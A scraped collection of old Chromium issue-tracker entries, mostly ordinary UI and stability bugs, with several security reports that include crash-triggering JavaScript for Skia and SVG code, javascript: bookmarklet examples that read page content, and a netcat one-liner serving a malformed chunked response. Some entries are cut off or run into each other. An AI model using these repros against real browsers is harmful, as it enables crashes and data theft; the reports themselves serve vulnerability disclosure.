title.$t: Issues - chromium
Modifying Omnibox URL prevents scheme from being copied

content.$t: Chrome Version : 5.0.375.6 What steps will reproduce the problem? 1. Browse to a URL (e.g. http://code.google.com/p/chromium/issues/detail?id=41467) 2. Select & Copy the entire Omnibar URL (e.g. code.google.com/p/chromium/issues/detail? id=41467) 3. Paste into a text editor. 4. Now modify the Omnibox URL (e.g. code.google.com/p/chromium/issues) 5. Select & Copy the entire Omnibar URL (e.g. code.google.com/p/chromium/issues) 6. Paste into a text editor. What is the expected result? http://code.google.com/p/chromium/issues What happens instead? code.google.com/p/chromium/issues Please provide any additional information below. Attach a screenshot if possible.

title.$t: Make mixed-content indicators correct

content.$t:
For https with mixed content we show the https in the omnibox in gray. 
Visually this makes me think I shouldn't care (gray is usually used to de-
emphasize something). When I showed it to Glen he wasn't thrilled about it 
either and though we should be using red in this situation.

title.$t: Sometimes the plugin doesn't load on Youtube

content.$t: Chrome Version : 5.0.396.0 (Build ufficiale 46416) dev URLs (if applicable) : http://www.youtube.com/user/Google#grid/user/12E3C2A3C2C732BC Other browsers tested: Safari 4: Firefox 3.x: OK? IE 7: IE 8: What steps will reproduce the problem? 1. Go To any YouTube user defined playlist of videos 2. load the first one 3. What is the expected result? At the end of each video the next one should be loaded. What happens instead? SOMETIMES the next video is not loaded and a "Missing Plugin" appears instead. I am forced to click on that video to reload. I suppose the flash plugin instance is not cleared properly or there is something wrong in Youtube code. It seems to work fine with firefox.

title.$t: ChromeFrame allows navigation to "gcf:" urls

content.$t:
in MSIE, in a Trident ChromeFrame window, a webpage can open any "about:" url using the following code:

    window.open('gcf:about:version');

in Chrome, the page navigates to "about:blank" for all "gcf:about:..." and "about:..." urls. It seems to me that a webpage should not be able to open "about:" urls in MSIE either (other than "about:blank").

Assigning security - not sure immediately how to abuse this, but IIRC there is a security reason why webpages in the internet cannot open "about:" urls in Chrome. Feel free to disagree and remove the label if you know otherwise.

title.$t: ChromeFrame crash in IE8 due to a zombie IInternetProtocol protocol data mapping

content.$t:
ChromeFrame can cause IE to behave erratically or crash if the underlying IInternetProtocol pointer is reused for a new transaction leaving the protdata protocol mapping intact, which is wrong.

The ProtData needs to be invalidated when the protocol is destroyed ideally.

title.$t: Notification can go away while settings menu is open.

content.$t: What steps will reproduce the problem? 1.Display a notification. 2.Click on the "settings" icon on the top right of the notification to open the settings menu for that notification. What is the expected output? What do you see instead? Notification should stay visible and frontmost while the menu is open. Please use labels and text to provide additional information. Notification bubble can disappear or go to background while the settings menu for the notification is displayed.

title.$t: Autofill rendering looks completely broken

content.$t: Chrome Version : 6.0.472.25 dev URLs (if applicable) : http://www.sailtrilogy.com/molokini/discover/#book What steps will reproduce the problem? 1. Go to http://www.sailtrilogy.com/molokini/discover/#book and start filling in the form What is the expected result? Autofill works. Completion popups look good. What happens instead? Every completion popup looks broken (see screenshot). Filling in data doesn't trigger autofill for the rest of the form (the form is shortly filled with data and most of the fields become yellow, but then the autofilled data disappears again when hitting tab). Please provide any additional information below. Attach a screenshot if possible.

title.$t: autofill label in configure sync dialog is truncated

content.$t: What steps will reproduce the problem? 1. Start chrome in French / Italian 2. Go to options > personal stuff > setup sync 3. In the configure sync dialog, under the "Choose what to sync", the first entry is truncated What is the expected output? no truncation What do you see instead? 1st checkbox entry is truncated see screenshot Please use labels and text to provide additional information. *** Happening also in French language

title.$t: Sync: Data types' titles should be truncated

content.$t:
ENVIRONMENT
Google Chrome	6.0.472.41 (Официално издание 56471)
WebKit		534.3
V8		2.2.24.15
Потребителски агент	Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.41 Safari/534.3
Команден ред	... --user-data-dir=C:\datadirs\6.0.472.41_A1 --enable-log --log-level=0 --lang=bg

REPRO STEPS
0. Start Chrome in Bulgarian or French (did not repro in German, Hebrew Russian);
1. Wrench -> Options -> Personal Stuff to sign into sync and enter valid credentials;
2. The Set up sync dialog should display.

ACTUAL RESULTS
Some of the strings for the data types we sync are only partially visible and not truncated.

EXPECTED RESULTS
Expected that either strings will be truncated or that we can display on-hover the full names.

content.$t: Chrome Version : 7.0.503.0 dev URLs (if applicable) : Other browsers tested: What steps will reproduce the problem? 1. Create context menu from an extension 2. title.$t: "Learn more" link from infobar doesn't work when outdated plug-ins are blocked.

content.$t: What steps will reproduce the problem? 1.Select "Allow only sandboxed plug-ins" from Wrench -> Options -> Under the Hood -> Content-settings -> Plug-ins 2.Launch www.cnn.com 3.Info bar is displayed stating - "This website uses the Flash plug-in; allow this plug-in to run? Learn more 4. Click on Learn more hyperlink What is the expected output? This should direct to a help page What do you see instead? The link doesn't redirect anywhere. Please use labels and text to provide additional information.

title.$t: terms_FOO.html is missing for fa,am and sw

content.$t:
chrome/app/resouces/terms does not have 

terms_am.html
terms_fa.html
terms_sw.html

Tentatively, terms_en.html is used in the trunk, but we have to put them in before the release.

For am and sw (at least), we need to get them translated before M6 release, I believe.

title.$t: Document extension security issues

content.$t:
On Tue, Nov 3, 2009 at 9:07 AM, Erik Kay <erikkay@xxxx> wrote:
> Adam,
>
> The other good point that came out of this thread is that we should
> have a security section in the extension docs which could talk about
> the dangers of XSS, etc. I don't think it needs to be incredibly
> comprehensive - to be honest, I'd rather it linked to other more
> detailed docs on XSS, etc., but it would be good to have something
> that covered the basics of the specific impact of XSS on extensions
> and the mitigations we have in the design.
>
> Could I convince you to take a swing at an initial draft of something?
>  We can have Kathy polish is up for word-smithing, diagrams, etc.  The
> docs are checked in at chrome/common/extensions/docs.  Just create a
> file in the "static" directory.
>
> Erik

title.$t: History expiry causes inline autocomplete flakiness

content.$t:
After using Chrome for a while, inline completion in the omnibox stops 
working in a subtly irritating way.

Basically, say you get to cnn.com by typing "c" and relying on "nn.com" 
being filled so you hit enter after typing "c". When the omnibox gets into 
this state you type "c", "nn.com" is indeed filled but after a very brief 
pause it disappears, so by the time you hit enter you end up doing a Google 
search for "c". The only cure is to type "cnn.com" in full and press enter, 
which seems to set it straight. This is very annoying.

I'm not sure if the cause is:

- having a profile for a while
- having stopped using a profile for a while. I noticed this on my work 
windows machine after returning from a 3 week vacation, and also on my 
linux machine which I only use occasionally... but think I recall seeing 
this on my laptop which I use continuously as well which leads me to 
theorize it's not just profiles that have been unused for a period of time.

Is some sort of history DB cleanup running here?

title.$t: WebKit cursor positioning on click in textarea inconsistent with non-Windows conventions

content.$t: Chrome Version: 4.0.202.2-r23795 OS + version: Ubuntu Jaunty CPU architecture: 64-bit window manager: ion3 URLs (if applicable): http://www.w3schools.com/TAGS/tryit.asp?filename=tryhtml_textarea Behavior in Firefox 3.x (if applicable): as expected Behavior in Chrome for Windows (optional): unknown What steps will reproduce the problem? 1. Delete all of the text in the textarea on the left side of the example URL. 2. Bang on the keyboard a bit until you have a half-line of text. The cursor should be positioned at the end of the typed text. 3. Now move the pointer down and to the left, so that its X position is in the middle of the typed text and its Y position is below it. 4. Left-click. What is the expected result? The cursor should be at the closest possible position to the spot where I clicked (in this case, it should stay at the end of the line), as is done in Firefox 3.0 and gedit. What happens instead? The cursor jumps up to the middle of the typed text (directly above the pointer). Please provide any additional information below. Attach a screenshot and backtrace if possible. This is possibly not Linux-only, although I don't know if the expected behavior is the same on other platforms. This is especially annoying when middle-clicking to try to paste the PRIMARY selection at the end of the line -- the cursor gets moved in the same way and the pasted text ends up in the middle of the line.

title.$t: Feature Request: Backspace should delete a grapheme cluster instead of a single Unicode character

content.$t: Chrome Version : 4.0.221.6 URLs (if applicable) : Other browsers tested: Add OK or FAIL after other browsers where you have tested this issue: Safari 4: Firefox 3.x: IE 7: IE 8: What steps will reproduce the problem? 1. Paste the word "ക്കരവയരവരെ" in any text field 2. put the cursor in between "ക്ക" and "രവയരവരെ" 3. Continuously press backspace. What is the expected result? Just "ക്ക" will get deleted. What happens instead? The whole word gets deleted. Please provide any additional information below. Attach a screenshot if possible. The word is "ka, virama, ka, ra, va, ...". The cursor is placed between: "ka, virama, ka" and "ra, va, ...". One backspace remove the last "ka" and makes the string: "ka, virama" and "ra, va, ..." However, "ka, virama, ra" forms a conjunct and cursor is moved to position between "ka, virama, ra" and "va, ...". This is the crucial step that causes above mentioned problem. Now one more backspace removes "ra" and the word becomes: "ka, virama" and "va, ..." which gets converted to: "ka, virama, va" and "..." The processes repeats until the whole word is removed. Couple of possible solutions I could propose would be: 1) Remove only one Unicode character; but never move internal cursor forward on backspace. Now there will be a inconsistency between the cursor shown and cursor inside. The visible cursor is behind the whole cluster. Windows XP Notepad works this way. 2) Remove only one Unicode character; however, prevent "ka, virama" from forming a conjunct with "ra" by rendering them as separate strings and display the cursor in between. The cluster is formed only when cursor is moved from this position. 3) Backspace could remove more than one character. To be precise, remove following regex before the cursor: (Virama? Consonant). Now the troublesome case would not arise.

title.$t: Non-Windows platforms: WPAD (proxy autodetect discovery) does not test DHCP

content.$t:
Chromium's implementation of WPAD is fairly limited, and only tests DNS for 
"wpad".

Really, DHCP should be tried first (by sending an INFORM message for option 
252).

Internet Explorer does this.

Chromium and Firefox however do not support it.

This bug isn't too severe, in that users can workaround it by manually 
entering the network's PAC location (whatever would have been returned by 
the 252) as a custom URL in the proxy settings.

But it is surely an inconvenience for setups relying on it.

title.$t: Manual update checks should always get the latest version (and not get error 12)

content.$t:
On the Mac, there's no difference in the update check from the About.. box 
vs. a periodic automatic check.

On Windows, a manual request has an extra 'installsource' field that can be 
either ondemandupdatecheck or ondemandinstall for on demand manual checks.

On the server side, we can use the extra data to make sure that people who 
click "install the update" always get the bits. 

This allows us to throttle automatic updates, while still servicing people 
who know the update is available and explicitly ask for it.

cc'ing ddorwin@google, who I think is familiar with how things work in 
Omaha on Windows.

title.$t: Chrome Buffer Overlow Vulnerability - "SaveAs" Function

content.$t:
SVRT - Bkis have just discovered vulnerability in Google Chrome 0.2.149.27
and would like to inform you with this. Here comes the report:

Details:

- Type of Issue: Buffer Overflow.

- Affected Software: Google Chrome 0.2.149.27.	

- Exploitation Environment: Google Chrome (Language: Vietnamese) on Windows
XP SP2.

- Impact: Remote code execution

- Description: 
The vulnerability is caused due to a boundary error when handling the
“SaveAs” function. On saving a malicious page with an overly long title
(<title> tag in HTML), the program causes a stack-based overflow and makes
it possible for attackers to execute arbitrary code on users’ systems.

- How an attacker could exploit the issue : 
To exploit the Vulnerability, a hacker might construct a specially crafted
Web page, which contains malicious code. He then tricks users into visiting
his Website and convinces them to save this Page. Right after that, the
code would be executed, giving him the privilege to make use of the
affected system.

- Exploitation code: Proof of Concept: Crash (Attached to this document).

- Researcher: AnhLD – SVRT member.

- About SVRT :
Bkis Vietnam is a security research center in Vietnam. SVRT, which is short
for Security Vulnerability Research Team, is one of Bkis researching
groups. SVRT specializes in the detection, alert and announcement of
security vulnerabilities in software, operating systems, network protocols
and embedded systems...

Bach Khoa Internetwork Security Center (Bkis)
Hanoi University of Technology (Vietnam)

Office: 5th Floor, Hitech building - 1A Dai Co Viet, Hanoi
Email: svrt@bkav.com.vn

title.$t: Chromium automatically continues the request for a sub-resource with a certificate error under some conditions.

content.$t:
This bug was reported by Adam Barth.

In ssl_policy.cc, DefaultPolicy:OnCertError, if the resource with a 
certificate error is a sub-resource, under some conditions (for example, if 
the main frame is HTTP) we automatically continue the request:

    error->ContinueRequest();

This is completely wrong and lets an active network attacker steal secure 
cookies.

Imagine that a page on http://attacker.com embeds an image to 
https://bank.com.  The attacker intercepts the network request and uses a 
self-signed certificate.  This generates a certificate error that we 
promptly ignore.

What do other browsers do under the same condition?

IE7 blocks the request and shows an infobar.

Firefox 3 and Safari 3.1 block the request hard, without an infobar.

Opera 9.52 pops up a certificate error dialog.

title.$t: Missing allow scripts and trusted sites security feature

content.$t:
Similar to the post I made earlier in Chromium-dev group, IE6 (and probably 
IE7) has a security feature to browse unknown sites with added safety 
without having to use another browser like Firefox with completely disabled 
Javascript, etc.  I've heard that it seems like everyone is getting 
infected with the fake AV XP 2008 scam/trojan that gets through with 
scripts.  I got stung twice with numerous defenses on a test partition. In 
IE6, you can put all trusted sites into a list (Tools | Internet Options |  
Security | Trusted Sites | Sites | <enter a site> | Add | OK | OK) which 
will be fully functional and turn disable Javascript, etc. for the rest of 
the world until you gain their trust (Tools | Internet Options | Security | 
Internet | Custom Level | (Reset to: ) High (or select your own options 
from a list) | Reset | Yes | OK | OK).  

See: http://www.darkreading.com/document.asp?doc_id=162515 for information 
about why this is so important because it's becoming harder to verify sites 
as safe.

title.$t: Security: intermittent NULL ptr crash when browser close attempted with a non-responsive tab

content.$t:
[Noticed this while investigating issue 3567; it may be related to that
bug, or be a separate problem. I couldn't narrow it down to any simpler
scenario or any specific, obvious functionality.]

Steps to reproduce:

1) Create test.html with '<body onunload="while(1)alert(1)">' or an
equivalent, visit the page.

2) Navigate away to example.com, silence alert() boxes.

3) Click multiple times on window close button, then tab close button
(you may need to do this cycle several times).

4) Open a new tab, navigate to example.com.

5) Open Chrome task manager, kill the annoying tab. Nothing particularly
interesting should happen immediately yet, which makes me believe it is not
merely an incarnation of bug 2579.

6) Try to close all tabs and exit Chrome (you may need to try closing them
in a different order) - you will very likely get a crash on a NULL pointer
dereference.

This crashes for me on 0.3.154.3. By itself not a major issue, but should
be investigated in case we access uninitialized memory or the like. Hope
you can reproduce with symbols =)

title.$t: About box: RTL layout incorrect for credits and ToS message

content.$t:
In 154.8
The new messages in the about box for credits and the terms of service are 
not properly laid out in RTL languages (ar, he). 

See attached.

The parentheses around the version in the status message are also 
incorrect.  I do not know if that is new in 154.8.

I might not hold up the release of 154.8 for this, but it needs to get 
fixed in an update soon if I do not.

title.$t: Importer tests are not being run at all

content.$t:
The review at:

http://codereview.chromium.org/9416

Causes that these tests are no longer run even in the presence of the test 
data. PathExists() does not take '*'.

I also think this early return is not the right thing to do, for example 
the ssl tests fail unless you have the certs.

Nobody reads the extra LOG output anyways.

title.$t: IDL compiler runs for every build regardless of whether or not there are changes

content.$t:
Every time I press F5 now even if I haven't changed anything, midl runs. I 
think this is related to some of the indexing changes recently.

This is a huge productivity suck since it requires relinking chrome_dll.

title.$t: Memory corruption in Adobe Acrobat EMBED object

content.$t:
Fast loading/unloading of Adobe Acrobat object through EMBED tags can cause 
memory corruption in FireFox. It seems all browsers run into problems at 
some point, though I've not seen crashes in other browsers.

http://skypher.com/SkyLined/Repro/COM/Object 
instantiation/EMBED%20type%20manual.html?application/pdf

I'd like to find out how this affects Chrome before I inform other venders.

title.$t: Chrome login my gmail account automaticaly. ( I have not let Chrome remember any password)

content.$t:
(Describe security bug here, with as much details and steps to reproduce as 
possible. Security bugs are visible only to the reporter and to project 
members.)

I found the problem with follow steps.
1. I opened gmail and started vedio chat with other.
2. My vedio chat window became a zombie window, the vedio was freeze, 
however, the chat function can be used normally. 
3. I opened XP's task manager, it showed that Chrome was "no reponse". and 
I killed the Chrome process by task manager
4. I opened Chrome, and clicked "restore page". I found Chrome login my 
gmail account automaticaly. Since at the time I was using my friend's PC, I  
have not let Chrome remember any password.)

title.$t: Chrome allows to drag javascript: URLs into bookmarks bar

content.$t:
Chrome allows to drag "javascript:" URLs into the bookmarks bar, just like 
normal "http:" URLs. This way users can get tricked into executing 
arbitrary JavaScript on whatever domain is currently loaded in the active 
tab when clicking on the bookmarked link.

A simple example on how to leverage that fact is to sniff the content of 
"chrome-resource://new-tab" – which usually would show the personal 
homepage. Given the history function of that page you could scan frequently 
used pages of that user (and potentially sniff URL parameters like sessions 
or password).

Example (drag to bookmarks bar, click on homepage):
<a href="javascript:alert(document.body.innerHTML)">drag</a>

A more complex example would be a script that really forwards to a 
destination, dragging a linked logo of news site or such into the bookmarks 
bar will be a frequently used feature for dragging bookmarks.

<a 
href="javascript:if(false){}else{document.location='http://news.google.com'
}">Google News</a>

The if statement could for example sniff for a certain domain and than 
interact with the website (e.g. to steal session or modify data). The 
example below interacts with the DOM of blogger.com when you are on your 
homepage – in all other cases it forwards to new.google.com:

<a 
href="javascript:if(document.location=='http://www.blogger.com/home'){alert
(document.body.innerHTML)}else{document.location='http://news.google.com'}"
>Google News</a>

A user might never realize that every click on the bookmark carries the 
risk of running malicious code on the open website.

Mitigating factors:

1. The risk of getting such a bookmark(let) installed is relatively low, 
although social engineering tricks might work well on such a simple task 
like dragging a link.

2. The tooltip of the bookmark shows that it is a JavaScript URL. Not that 
anybody who would fall for this trick would really understand what that 
means.

Internet Explorer 7 does not allows dragging of JavaScript URLs, it even 
generates a warning message when you try to add a javascrip: URL via a 
context menu. 

Both seem to be a reasonable counter measure to avoid people hijack 
bookmarks.

title.$t: XMLHTTPRequest reads httpOnly cookies

content.$t:
Chrome Version       : 1.0.154.36
URLs (if applicable) : http://ha.ckers.org/httponly.cgi
Other browsers tested: 
  Add OK or FAIL after other browsers where you have tested this issue:
     Safari 3: ?
    Firefox 3: Fail
         IE 7: Pass for Set-Cookie but not Set-Cookie2

What steps will reproduce the problem?
1. Please see this page for a tester for this problem:
http://ha.ckers.org/httponly.cgi


What is the expected result? 
All cookies flagged as "httpOnly" should be inaccessible via any scripting 
including the XMLHttpRequest.getAllResponseHeaders() function which 
currently reveals them.

What happens instead?
The httpOnly cookies are revealed to the browser which can allow for XSS 
vulnerabilities.

Please provide any additional information below. Attach a screenshot if 
possible.

Firefox has similar issues which are being fixed:
https://bugzilla.mozilla.org/show_bug.cgi?id=380418
http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-
vulnerable-to-xmlhttprequest/

IE 7 was recently patched which fixed Set-Cookie but not Set-Cookie2:
http://www.microsoft.com/technet/security/bulletin/ms08-069.mspx

Background information on httpOnly:
http://www.owasp.org/index.php/HTTPOnly
http://msdn.microsoft.com/en-us/library/ms533046.aspx

title.$t: Pages that use Gears hang when you open the javascript debugger

content.$t:
Repro:
1. Open the Javascript debugger (Ctrl+Shift+L)
2. Visit gears.google.com (or any other site that loads gears).
3. Hang.

The hang persists after the debugger is closed.

title.$t: Rogue renderer can tamper with Windows.

content.$t:
If I've read the code correctly, the renderer sends a message to the 
browser (DidMove) along with an HWND and window size / position and 
clipping mask.  This means a rouge renderer could guess HWNDs, and modify 
any Windows on a users desktop.  This includes making them disappear with 
an empty clipping mask, moving them around, etc.

I think we will have to come up with a solution that grants a token to the 
renderer, which allows it to pass back only HWNDs which it has been 
granted.  There will additionally be a problem with revocation, since the 
browser must not honor HWNDs which have since been destroyed.  An attack 
there would be to do something from the renderer (load and unload plugin 
windows) to create lots of new HWNDs.  Since these HWNDs are likely to get 
reused (I imagine, just like pids?), if a new Window is created (say 
someone opens notepad), the renderer's old token for this HWND must now be 
invalid.

The state could also be managed by the browser, keeping track of which 
plugin windows have been created and destroyed.  Then the message from the 
renderer would just be something like "Please update my plugin window 0", 
or something.

Hi,

new tab, then it inherits the login details from the previous TAB. But as 
per the early annoucement, the TABs doesnt share any details and they ran 
in their own process.

title.$t: zdi-can-464: malformed svglist parsing code execution
Prompt for default browser on second run (and subsequent launches)

content.$t:
If chrome is not set as the default browser, it should prompt to take the 
default browser setting (like all other browsers do) on launch.  
However, we should not prompt on the first run because users will not be 
ready to make a decision yet.
The prompt should also have a "don't ask me again" checkbox.

title.$t: Change to scoped_variant_win.cc blocking official builds

content.$t:
r12081 introduced IsLeakableVarType which is not properly handled when 
building as an OFFICIAL_BUILD.  As a result the official builds are failing 
:

10>.\scoped_variant_win.cc(51) : error C3861: 'IsLeakableVarType': 
identifier not found

It appears that "DCHECK(!IsLeakableVarType(var_.vt))..." should be 
converted into a macro that does the right thing for official builds.

title.$t: SkMask::computeImageSize() integer overflow

content.$t:
An integer overflow can be triggered in 
skia\sgl\skmask.cpp!SkMask::computeImageSize, which leads to Chrome (2.x) 
not allocating sufficient memory for data. This issue can likely be 
exploited to execute arbitrary code. The vulnerable code is:

size_t SkMask::computeImageSize() const
{
    return fBounds.height() * fRowBytes;
}

As you can see, there is no check if the result of the multiplication can 
fit in a size_t. Here's some JavaScript that can be used to trigger the 
issue:

<SCRIPT>
  oCanvas=document.createElement("CANVAS");
  o2dContext=oCanvas.getContext("2d");
  o2dContext.transform(78,76,-6,0,-10000,9);
  o2dContext.translate(-55,0);
  o2dContext.rotate(1000);
  o2dContext.shadowBlur=1000;
  o2dContext.shadowOffsetX=1;
  o2dContext.clearRect(1,5,48,-21);
</SCRIPT>

title.$t: Buffer overflow in browser process while de-serializing SkBitmap  (heap overwrite)

content.$t:
The function 
bool ParamTraits<SkBitmap>::Read(const Message* m, void** iter, SkBitmap* has a buffer overflow when it calls 

bmp_data->InitSkBitmapFromData(r, variable_data, variable_data_size);

Because |bmp_data| and |variable_data| need to be consistent with each 
other but nobody checks that is so.

In other words, we have: 
   memcpy(bitmap->getPixels(), pixels, total_pixels);

and |pixels| and |total_pixels| are attacker controlled.

content.$t: What steps will reproduce the problem? 1. Go to skylined.deviantart.com. 2. Enter some stuff in username/password and click "login" 3. An error message popups up - Chrome browser process crashes. I've attached a screenshot of the crash message. (We really should make it possible to copy+paste the text). I just deleted my output directory and rebuilt Chrome 2 (lkgr 15038). This does not repro with Chrome 1.*.

title.$t: ReadAV [ARBITRARY]@chrome!NPAPI::PluginInstance::NPP_DestroyStream+0x111

content.$t:
I've found what seems to be a memory corruption vulnerability in Chrome. 
Unfortunately, I cannot repro the issue on my machine. I've attached all 
the information my FuzzFramework as able to collect. It seems to have been 
able to reproduce the issue 3/10 times it tried. I think this may be a race 
condition in creating/deleting NPAPI plugins or something. Maybe the object 
is destroyed before it is fully initialized, or whatever.

You can try to repro this using repro_server.py, which is a small HTTP 
server that can serve "repro" files created by my framework. In this case 
the "repro" file for the problem id "Problem #1 Repro.http-
bodies.log_entries.gozer3.pickle". My FuzzFramework runs with "page heap" 
enabled so that may be a requirement to detect the issue. It was found on 
XPSP3 with a Chromium v2 built about a week old.

The file "Problem #1 Details.cdb output.gozer3.txt" contains all relevant 
output from cdb.exe that FuzzFramework extracted from one of the crashes - 
it may be useful in tracking down the cause of the issue.

I'm sorry I cannot provide more info, I hope we can track down the root 
cause as this seems to be exploitable.

title.$t: V8Proxy::ToNativeObjectImpl  ASSERT(MaybeDOMWrapper(object));

content.$t:
FuzzFramework detected that it can causes random AVs using code similar to 
this:

<SCRIPT>
  altGlyph = top.document.createElementNS("http://www.w3.org/2000/svg", 
"altGlyph");
  altGlyph.x.animVal.insertItemBefore(null, 2);
</SCRIPT>

(FuzzFramework was using another "SVGLength" object instead of null, but 
the above repro is simpler and should trigger the same code path.)

From what I can tell, the code assumes too much about what value of the 
argument is limited to - objects that are not "valid" arguments are not 
handle properly leading to random AVs in release builds.

title.$t: Memory corruption on dragging file to a new tab

content.$t: What steps will reproduce the problem? 1. Turn on debug heap: gflags.exe -p /full /backwards /enable {path to chrome.exe} (gflags.exe is part of "Debugging Tools for Windows" 2. Start chrome.exe in windbg.exe windbg.exe -o {path to chrome.exe} 3. Ignore (F5) the debug breakpoints. 4. When the chrome window opens up, drag any local .html file towards the chrome window; drag it next to the only open tab ("New Tab") so the arrow indicates the .html file will be opened in a new tab. Drop the file. You should see an AV like this: (9d8.13fc): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. ntdll!RtlVirtualUnwind+0x215: 00000000`77bab745 488b02 mov rax,qword ptr [rdx] ds:fffffa60`0e00e828=???????????????? Tested with 2.0.180.0 (15749) on Windows Vista x64. This AV seems to indicate memory corruption in the browser process, which would be a security risk. I am surprised the AV does not crash the browser... I'd like to know why! title.$t: REGRESSION: Horrifically slow typing performance in Gmail's rich text editor

content.$t:
REGRESSION: Horrifically slow typing performance in Gmail's rich text 
editor

Observed in 3.0.182.0 (Developer Build 16846)

Repro steps:
1. Reply inline to an email.
2. Type a number lines of text.
3. At some point, the associated renderer starts thrashing the CPU on each 
keystroke

Composing replies becomes pretty impossible when in this state.

I've noticed that if I wait a while, the problem goes away until I again 
type a number of characters.  It feels like there is some garbage 
accumulation that gets flushed out periodically -- garbage collection issue 
perhaps?  Or, is this a Gmail editor issue unrelated to V8?

title.$t: :: sigh :: Regression: We always pop up the extension dialog behind the browser window now

content.$t:
Not sure when this regressed. I suspect it is because the dialog code got 
moved to a background thread in ExtensionsServiceBackend.

title.$t: Really crashy on window close with extensions installed

content.$t:
It gets easier to repro this the more extensions you have installed. On opt 
builds, on my machine, I need about 5 to get it every time. On dbg builds, on 
a different machine, I'm seeing it after about 3 (not sure why it's 
different).

1. Enable extensions
2. Install about 5 extensions
3. Open a new window (a second window)
4. Close the second window

If no crash, repeating steps 3 and 4 a few times usually cause it.

title.$t: Security: browser crash with memmove() memory corruption upon large chunked encoding chunk size

content.$t:
To reproduce, run this "listener of death" from a Linux command line:

echo -ne 'HTTP/1.1 200 OK\r\nTransfer-Encoding:
chunked\r\n\r\nffff0000\r\nhello\r\n' | nc -l -p 8080 localhost

(I can likely host this on App Engine if required).

And then point Chrome at http://localhost:8080/

The browser will go down immediately. It's memory errors so this will need
to go out as a Severity: Critical security update.

Various crash dumps are triggering this in the wild at a rate of many per
day, so fixing this is a useful stability boost too.

Most usual symptom is:
Thread 5 *CRASHED* (EXCEPTION_ACCESS_VIOLATION @0x004bfffe)
0x6a6b140a 	[chrome.dll 	- string_piece.cc:54] 
StringPiece::find(char,unsigned int)
0x6a4f3872 	[chrome.dll 	- http_chunked_decoder.cc:96] 
net::HttpChunkedDecoder::ScanForChunkRemaining(char const *,int)
0x6a4f3825 	[chrome.dll 	- http_chunked_decoder.cc:78] 
net::HttpChunkedDecoder::FilterBuf(char *,int)
0x6a4e18b9 	[chrome.dll 	- http_network_transaction.cc:851] 
net::HttpNetworkTransaction::DoReadBodyComplete(int)
0x6a4e0e2f 	[chrome.dll 	- http_network_transaction.cc:467] 
net::HttpNetworkTransaction::DoLoop(int)
0x6a4e0734 	[chrome.dll 	- http_network_transaction.cc:376] 
net::HttpNetworkTransaction::OnIOComplete(int) 

However a less usual symptom illustrates the severity:
Thread 6 *CRASHED* (EXCEPTION_ACCESS_VIOLATION @0x00ac8000)
0x0221edca 	[chrome.dll 	- MEMCPY.ASM:188] 	memmove
0x01e1383a 	[chrome.dll 	- http_chunked_decoder.cc:84] 
net::HttpChunkedDecoder::FilterBuf(char *,int)
0x01e018b9 	[chrome.dll 	- http_network_transaction.cc:851] 
net::HttpNetworkTransaction::DoReadBodyComplete(int)
0x01e00e2f 	[chrome.dll 	- http_network_transaction.cc:467] 
net::HttpNetworkTransaction::DoLoop(int)

The root cause is a signedness error. Note that although the code lineage
is from Mozilla, Mozilla is not affected because it uses unsigned types in
its version.

I don't yet have a chromium.org account. Due to the severity of the issue,
I'd like help landing the patch I'm about to upload.

title.$t: extensions_service_unittest.cc disabled in gyp-generated unit_tests.exe

content.$t:
I've left out devtools_sanity_unittest.cc from the gyp-generated build of 
unit_tests.exe in order to land the gyp conversion.  When I run the gyp-
generated unit_tests.exe, it simply dies with no error message in the middle 
of ExtensionsServiceTest, last output I get below:

[----------] 13 tests from ExtensionsServiceTest
[ RUN      ] ExtensionsServiceTest.CleanupOnStartup
[       OK ] ExtensionsServiceTest.CleanupOnStartup (1969 ms)
[ RUN      ] ExtensionsServiceTest.InstallExtension

title.$t: Security: possible memory corruption in v8 regex execution engine

content.$t:
This bug actually surfaced as a reliability issue. The UI-driven test case is:

1) Go to http://www.iit.edu/~laksvij/language/tamil.html
2) Click in the "Type your text here" textarea.
3) Instant tab death.

We're getting crash reports of this in the wild.

In my debugger, I see this:

#5  0x09a6512c in CheckHelper (
    file=0xa6d2554
"/usr/local/google/cevans/chrome/home/chrome-svn/tarball/chromium/src/v8/src/ia32/regexp-macro-assembler-ia32.cc",
line=1217, 
    source=0xa6d2888 "static_cast<size_t>(old_stack_top - stack_pointer) <=
size", condition=false)
    at

What is the expected output? A renderer should not crash. What do you see instead? A renderer crashes. Please use labels and text to provide additional information. It seems r13964 (*1) changes PopupListBox::getRowFont() and call menuStyle() to retrieve a font (including its height) that renders a row. On the other hand, PopupListBox::getRowHeight() still calls itemStyle() to retrieve the height of a row. This causes a style inconsistency between a font height and a row height in the PopupListBox class. (*1) <http://chrome- svn.corp.google.com/viewvc/chrome/trunk/deps/third_party/WebKit/WebCore/platform/chromium/P opupMenuChromium.cpp?r1=13477&r2=13964&pathrev=13964>

title.$t: RSAPrivateKey decoding ocassionally fails

content.$t:
There have been sporadic crashes in SignatureCreator unit tests and in 
RSAPrivateKey tests.

These both seem to stem from errors encoding and decoding private keys that 
have integers whose most-significant bytes are zero.

When encoding, any zero most-significant bytes should be dropped, but an 
extra zero most-significant byte should be added back if the most-
significant *bit* (the sign bit) would otherwise be 1. This is to force the 
value to be positive.

When decoding, a single leading zero byte should be initially dropped, as 
it was probably there to force the value to  be positive. But then zeroes 
must be added back up to the expected size of the field, which can be 
derived from the modulus size. The modulus should not have the problem of 
leading zero bytes, as it is specifically chosen such that its high byte is 
> 0.

title.$t: Security: Redirected XHR includes custom headers, CSRF risk

content.$t:
(Originally discovered by Eric Lawrence.)

It appears that Google Chrome 2’s XHR implementation will follow a 307 and reissue the original 
request to an x-domain target.  While Chrome will properly block the response from being read, 
any custom headers or body on the original request will be re-transmitted to the victim site 
which might take unsafe action.

As noted by http://code.google.com/p/browsersec/wiki/Part2, this might subvert an CSRF-
defense:

"Please note that the degree of flexibility offered by XMLHttpRequest, and not seen in other 
cross-domain content referencing schemes, may be actually used as a simple security 
mechanism: a check for a custom HTTP header may be carried out on server side to confirm that 
a cookie-authenticated request comes from JavaScript code that invoked 
XMLHttpRequest.setRequestHeader(), and hence must be triggered by same-origin content, as 
opposed to a random third-party site. This provides a coarse cross-site request forgery 
defense, although the mechanism may be potentially subverted by the incompatible same-origin 
logic within some plugin-based programming languages, as discussed later on."

title.$t: Regression: r21621 (add mole info...) breaks page action event setup

content.$t:
